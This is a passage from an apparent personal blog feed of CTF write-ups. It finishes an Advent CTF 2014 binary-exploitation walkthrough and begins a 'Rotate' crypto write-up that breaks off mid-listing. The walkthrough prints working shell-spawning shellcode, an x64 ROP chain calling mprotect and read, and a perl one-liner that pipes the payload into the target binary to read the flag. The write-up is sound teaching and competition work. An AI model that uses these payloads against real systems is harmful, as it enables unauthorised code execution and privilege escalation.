</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I thought I was home-free! Let&rsquo;s cat that flag and be done with it! But what&rsquo;s this? (Yes, I&rsquo;ve started using kali! =))</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python exploit.py
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span>
</span><span class='line'>ls -alh
</span><span class='line'>total 36K
</span><span class='line'>dr-xr-xr-x <span class="m">2</span> root shellcodeme2 4.0K Dec <span class="m">22</span> 22:09 .
</span><span class='line'>drwxr-xr-x <span class="m">3</span> root root         4.0K Dec <span class="m">22</span> 22:09 ..
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2  <span class="m">220</span> Sep <span class="m">26</span> 04:49 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2 3.4K Sep <span class="m">26</span> 04:49 .bashrc
</span><span class='line'>-rw-r--r-- <span class="m">1</span> root shellcodeme2  <span class="m">675</span> Sep <span class="m">26</span> 04:49 .profile
</span><span class='line'>-r--r----- <span class="m">1</span> root shellcodeme2   <span class="m">34</span> Dec <span class="m">22</span> 22:09 flag
</span><span class='line'>-r-xr-sr-x <span class="m">1</span> root shellcodeme2 8.5K Dec <span class="m">22</span> 22:09 shellcodeme2
</span><span class='line'>cat flag 2&gt;<span class="p">&amp;</span>1
</span><span class='line'>cat: flag: Permission denied
</span></code></pre></td></tr></table></div></figure>


<p>Gah! We need to exploit another binary! This one is the same C code, but compiled as x64 code&hellip; I transferred the binary over to my box and started poking it.</p>

<p>The basic solution stays the same: mprotect, read, shellcode, flag. The problem with x64 is that we cannot pass the arguments to calls on the stack: that goes via registers. The two functions I needed are here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x00000000004005f2 &lt;+53&gt;:   mov    edx,0x400
</span><span class='line'>   0x00000000004005f7 &lt;+58&gt;:    mov    rsi,rax
</span><span class='line'>   0x00000000004005fa &lt;+61&gt;:    mov    edi,0x0
</span><span class='line'>   0x00000000004005ff &lt;+66&gt;:    mov    eax,0x0
</span><span class='line'>   0x0000000000400604 &lt;+71&gt;:    call   0x400490 &lt;<span class="nb">read</span>@plt&gt;
</span><span class='line'>   0x0000000000400609 &lt;+76&gt;:    mov    edx,0x1
</span><span class='line'>   0x000000000040060e &lt;+81&gt;:    mov    esi,0x400
</span><span class='line'>   0x0000000000400613 &lt;+86&gt;:    mov    edi,0x20000000
</span><span class='line'>   0x0000000000400618 &lt;+91&gt;:    call   0x4004c0 &lt;mprotect@plt&gt;
</span></code></pre></td></tr></table></div></figure>


<p>I uploaded the binary to <a href="https://ropshell.com">ropshell.com</a> and analyzed it to find the gadgets I&rsquo;d need. I found <code>esi/rsi</code> and <code>edi/rdi</code> quickly, but <code>edx/rdx</code> was nowhere to be found. Finally, I located these two gadgets:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>0x0040068a : pop rbx<span class="p">;</span> pop rbp<span class="p">;</span> pop r12<span class="p">;</span> pop r13<span class="p">;</span> pop r14<span class="p">;</span> pop r15<span class="p">;</span> ret
</span><span class='line'>0x00400671 : mov edx, ebp<span class="p">;</span> mov rsi, r14<span class="p">;</span> mov edi, r15d<span class="p">;</span> call <span class="o">[</span>r12 + rbx*8<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Prepare for some mind-bending ROP chains&hellip;</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;L&quot;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">   #0x0040068a : pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
</span><span class='line'><span class="sd">   #0x00400671 : mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># first, fix up stack   </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400690</span><span class="p">)</span>   <span class="c"># pop pop ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c">#### MPROTECT</span>
</span><span class='line'><span class="c"># gadgets to set edi, esi and edx and call mprotect</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0040068a</span><span class="p">)</span>   <span class="c"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span>          <span class="c"># rbx   &lt;&lt; needs to be ebp-1 for code path!</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>          <span class="c"># rbp -&gt; edx = mprotect.mask</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00601038</span><span class="o">-</span><span class="mi">6</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c"># r12 -&gt; mprotect@got.plt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r13</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>            <span class="c"># r14 -&gt; rsi -&gt; esi = mprotect.len</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>   <span class="c"># r15 -&gt; rdi -&gt; edi = mprotect.addr</span>
</span><span class='line'>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400671</span><span class="p">)</span>   <span class="c">#mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">200</span><span class="o">-</span><span class="mi">144</span><span class="p">)</span>   <span class="c"># spacer</span>
</span><span class='line'>
</span><span class='line'><span class="c">#### READ</span>
</span><span class='line'><span class="c"># gadgets to set edi, esi and edx and call read</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="sd">   0x00000000004005f2 &lt;+53&gt;:   mov    edx,0x400</span>
</span><span class='line'><span class="sd">   0x00000000004005f7 &lt;+58&gt;:   mov    rsi,rax</span>
</span><span class='line'><span class="sd">   0x00000000004005fa &lt;+61&gt;:   mov    edi,0x0</span>
</span><span class='line'><span class="sd">   0x00000000004005ff &lt;+66&gt;:   mov    eax,0x0</span>
</span><span class='line'><span class="sd">   0x0000000000400604 &lt;+71&gt;:   call   0x400490 &lt;read@plt&gt;</span>
</span><span class='line'><span class="sd">&#39;&#39;&#39;</span>
</span><span class='line'><span class="c"># 0x601020 &lt;read@got.plt&gt;</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0040068a</span><span class="p">)</span>   <span class="c"># pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>       <span class="c"># rbx   &lt;&lt; needs to be ebp-1 for code path!</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x400</span><span class="p">)</span>            <span class="c"># rbp -&gt; edx = 0x400</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x601020</span><span class="o">-</span><span class="mh">0x3ff</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>   <span class="c"># r12 -&gt; read@got.plt</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r13 </span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>   <span class="c"># r14 -&gt; rsi -&gt; esi = read.addr</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x0</span><span class="p">)</span>          <span class="c"># r15 -&gt; rdi -&gt; edi = 0?</span>
</span><span class='line'>                          <span class="c"># lucky for me, rax = 0</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x00400671</span><span class="p">)</span>   <span class="c">#mov edx, ebp; mov rsi, r14; mov edi, r15d; call [r12 + rbx*8]</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;B&quot;</span><span class="o">*</span><span class="p">(</span><span class="mi">200</span><span class="o">-</span><span class="mi">144</span><span class="p">)</span>   <span class="c"># spacer</span>
</span><span class='line'>
</span><span class='line'><span class="c"># return to shellcode!</span>
</span><span class='line'><span class="n">payload</span> <span class="o">+=</span> <span class="n">p</span><span class="p">(</span><span class="mh">0x20000000</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">payload</span>
</span></code></pre></td></tr></table></div></figure>


<p>One of the tricky things with the mprotect and read ROP chains is the following. The code at <code>0x400671</code>, which I use to set <code>edx</code>, looks like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'>   <span class="mh">0x400671</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">65</span><span class="o">&gt;</span><span class="p">:</span> <span class="n">mov</span>    <span class="n">edx</span><span class="p">,</span><span class="n">ebp</span>
</span><span class='line'>   <span class="mh">0x400673</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">67</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">rsi</span><span class="p">,</span><span class="n">r14</span>
</span><span class='line'>   <span class="mh">0x400676</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">70</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span><span class="n">r15d</span>
</span><span class='line'>   <span class="mh">0x400679</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">73</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">call</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="p">[</span><span class="n">r12</span><span class="o">+</span><span class="n">rbx</span><span class="o">*</span><span class="mi">8</span><span class="p">]</span>
</span><span class='line'>   <span class="mh">0x40067d</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">77</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">add</span>    <span class="n">rbx</span><span class="p">,</span><span class="mh">0x1</span>
</span><span class='line'>   <span class="mh">0x400681</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">81</span><span class="o">&gt;</span><span class="p">:</span>    <span class="nb">cmp</span>    <span class="n">rbx</span><span class="p">,</span><span class="n">rbp</span> 
</span><span class='line'>   <span class="mh">0x400684</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">84</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">jne</span>    <span class="mh">0x400670</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">64</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="mh">0x400686</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">86</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">add</span>    <span class="n">rsp</span><span class="p">,</span><span class="mh">0x8</span>
</span><span class='line'>   <span class="mh">0x40068a</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">90</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">rbx</span>
</span><span class='line'>   <span class="mh">0x40068b</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">91</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">rbp</span>
</span><span class='line'>   <span class="mh">0x40068c</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">92</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r12</span>
</span><span class='line'>   <span class="mh">0x40068e</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">94</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r13</span>
</span><span class='line'>   <span class="mh">0x400690</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">96</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r14</span>
</span><span class='line'>   <span class="mh">0x400692</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">98</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">pop</span>    <span class="n">r15</span>
</span><span class='line'>   <span class="mh">0x400694</span> <span class="o">&lt;</span><span class="n">__libc_csu_init</span><span class="o">+</span><span class="mi">100</span><span class="o">&gt;</span><span class="p">:</span>   <span class="n">ret</span>
</span></code></pre></td></tr></table></div></figure>


<p>First <code>ebp</code> is copied to <code>edx</code>. Then <code>rsi</code> and <code>edi</code> are set. Then we call the QWORD pointer at a memory address referenced by <code>esi</code> and <code>ebx</code>. I chose to <code>esi</code> and <code>ebx</code> such that they point to the got pointer of mprotect.</p>

<p>The problem arises after returning from the mprotect call:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x40067d &lt;__libc_csu_init+77&gt;:  add    rbx,0x1
</span><span class='line'>   0x400681 &lt;__libc_csu_init+81&gt;:   cmp    rbx,rbp
</span><span class='line'>   0x400684 &lt;__libc_csu_init+84&gt;:   jne    0x400670 &lt;__libc_csu_init+64&gt;
</span></code></pre></td></tr></table></div></figure>


<p>So I needed to make sure that <code>rbx</code> and <code>rbp</code> were equal, otherwise the code jumps away and I inevitably got a crash. I solved that problem by setting <code>rbx</code> to <code>rbp-1</code>. Only thing left was to adjust <code>esi</code> and away we go! With the problem of setting <code>edx</code> out of the way, I could call mprotect to set <code>0x20000000</code> to rwx and read in the shellcode. This needed to be run from the shell that I obtained from exploiting the first binary.</p>

<p>I sprinkled in some <a href="http://www.shell-storm.org/shellcode/files/shellcode-878.php">shellcode magic</a> and was able to exploit the binary locally!</p>

<p>Remotely, I ran into a problem: I could not make files on the remote system, nor was python installed. I rewrote the exploit to dump the shellcode as printable bytes:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">shellcode</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">output</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>  <span class="n">output</span> <span class="o">+=</span> <span class="s">&quot;</span><span class="se">\\</span><span class="s">x&quot;</span> <span class="o">+</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="p">:</span><span class="n">i</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">output</span>
</span></code></pre></td></tr></table></div></figure>


<p>I tried to run the exploit and shellcode using various combinations of echo and printf (also after spawning /bin/bash) but nothing seemed to work. It seemed the exploit didn&rsquo;t work with those two bash builtins, while it did with python. I looked for a replacement and lo and behold: perl was installed on the remote box! I rewrote the exploit to read <code>flag</code> instead of <code>/etc/passwd</code>. For this, I had to adjust the offset:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">xor</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mi">11</span><span class="p">],</span> <span class="mh">0x41</span>
</span><span class='line'><span class="o">--&gt;</span>
</span><span class='line'><span class="n">xor</span> <span class="n">byte</span> <span class="p">[</span><span class="n">rdi</span> <span class="o">+</span> <span class="mi">4</span><span class="p">],</span> <span class="mh">0x41</span>
</span></code></pre></td></tr></table></div></figure>


<p>And <strong>finally</strong>, starting from the first binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python exploit.py
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>shellcodeme<span class="o">)</span>
</span><span class='line'><span class="o">(</span>perl -e <span class="s1">&#39;print &quot;\x90\x06\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8a\x06\x40\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x08\x10\x60\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x8a\x06\x40\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x28\xf0\x5f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x71\x06\x40\x00\x00\x00\x00\x00\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x00\x00\x00\x20\x00\x00\x00\x00&quot;&#39;</span><span class="p">;</span> perl -e <span class="s1">&#39;print &quot;\xeb\x3f\x5f\x80\x77\x04\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xffflag\x41&quot;&#39;</span><span class="o">)</span> <span class="p">|</span> ./shellcodeme2
</span><span class='line'>ADCTF_I_l0v3_tH15_4W350M3_m15T4K
</span></code></pre></td></tr></table></div></figure>


<p>This one was tough, but a fun one nonetheless! ROP all the things! =)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Advent CTF 2014 - Rotate]]></title>
    <link href="http://barrebas.github.io/blog/2014/12/21/advent-ctf-2014-rotate/"/>
    <updated>2014-12-21T16:09:36+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/12/21/advent-ctf-2014-rotate</id>
    <content type="html"><![CDATA[<p>A crypto challenge! We&rsquo;re given a zip-file, containing <code>flag.jpg.enc</code> and <code>rotate.py</code>.</p>

<!-- more -->


<p><code>rotate.py</code> handles the encryption, but only does so one way:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">math</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">p</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;f&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
</span><span class='line'><span class="n">u</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;b&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">filename</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">radians</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
</span><span class='line'>
</span><span class='line'><span class="n">bs</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#39;rb&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span><span class='line'><span class="n">enc</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span> <span class="o">+</span> <span class="s">&#39;.enc&#39;</span><span class="p">,</span> <span class="s">&#39;wb&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">bs</span><span class="p">),</span> <span class="mi">2</span><span class="p">):</span>
